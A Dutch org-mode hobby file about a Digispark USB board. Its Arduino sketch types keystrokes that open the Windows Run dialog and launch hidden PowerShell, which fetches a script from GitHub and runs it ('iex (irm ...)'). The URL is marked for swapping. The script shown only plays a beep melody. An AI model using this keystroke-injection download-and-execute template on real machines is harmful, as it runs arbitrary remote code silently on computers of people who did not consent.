#+TITLE: Digispark speeltuin
#+auto_tangle: t


* Inhoud :toc:
- [[#about][About]]
- [[#execute_powershell_scriptino][Execute_Powershell_Script.ino]]
- [[#scriptps1][script.ps1]]
  - [[#oude-tests--][Oude tests :-)]]

* About
In deze org file speel ik met powershell scripts die ik in mijn cloud zet.


* Execute_Powershell_Script.ino

#+begin_src C :tangle Powershell.ino
#include "DigiKeyboard.h"

void setup() {
  // empty
}

void loop() {
  // Initialise digispark
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(600);

  // Opens the run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Writes the command
  DigiKeyboard.print("powershell -w h ");
  DigiKeyboard.print("iex (irm \"");
  DigiKeyboard.print("https://raw.githubusercontent.com/Prutserdt/dotfiles/master/Stack/Code/Powershell/script.ps1");  // LINK HERE
  DigiKeyboard.print("\")");
  // Enters it
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {/* Stops the loop */}
}
#+end_src





* script.ps1
Mijn huidige script staat hier onder. Deze staat in mijn cloud en klaar om gebruikt te worden met mijn digispark.

#+begin_src shell :tangle script.ps1
[System.Console]::beep(440, 500)
[System.Console]::beep(440, 500)
[System.Console]::beep(440, 500)
[System.Console]::beep(349, 350)
[System.Console]::beep(523, 150)
[System.Console]::beep(440, 500)
[System.Console]::beep(349, 350)
[System.Console]::beep(523, 150)
[System.Console]::beep(440, 1000)
[System.Console]::beep(659, 500)
[System.Console]::beep(659, 500)
[System.Console]::beep(659, 500)
[System.Console]::beep(698, 350)
[System.Console]::beep(523, 150)
[System.Console]::beep(415, 500)
[System.Console]::beep(349, 350)
[System.Console]::beep(523, 150)
[System.Console]::beep(440, 1000)
exit 0 # success
#+end_src




** Oude tests :-)
